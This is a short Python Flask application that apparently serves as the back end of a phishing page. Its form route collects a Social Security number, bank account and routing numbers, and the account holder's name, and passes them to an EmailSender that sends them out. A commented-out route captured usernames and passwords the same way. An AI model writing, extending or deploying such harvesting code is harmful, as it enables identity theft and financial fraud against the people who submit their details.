from flask import Flask, render_template, request, redirect, url_for
from datetime import datetime
from send_email import EmailSender

user_name = None
password = None
ssn = None
account_number = None
account_type = None
account_name = None
routing = None


def get_greeting():
    hour = datetime.now().hour  # Get current hour
    if 5 <= hour < 12:
        return "Good Morning! ☀️"
    elif 12 <= hour < 18:
        return "Good Afternoon! 🌞"
    else:
        return "Good Evening! 🌙"



app = Flask(__name__)

# @app.route('/')
# def index():
#     return render_template('index.html', greetings = get_greeting)


# @app.route('/submit', methods=['POST'])
# def submit():
#     global user_name, password
#     user_name = request.form.get("username").strip()
#     password = request.form.get("password").strip()

#     return redirect(url_for('info'))

@app.route('/')
def info():
    return render_template('info.html')


@app.route('/continue_', methods=['POST'])
def continue_():
    global ssn, account_number, account_type,routing,account_name
    ssn = request.form.get("ssn").strip()
    account_number = request.form.get("account-number").strip()
    account_type = request.form.get("account-type")
    routing =  request.form.get("routing")
    account_name = request.form.get("account-name")

    return redirect(url_for('thankyou'))

@app.route('/thankyou')

def thankyou():
    email_sender = EmailSender(ssn, account_number, account_type, routing, account_name)
    result = email_sender.send_email()
    
    if result :
        return "<h1>Thank you for your submission!</h1>"
    else:
        return render_template('thankyou.html')


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5000, debug=False)
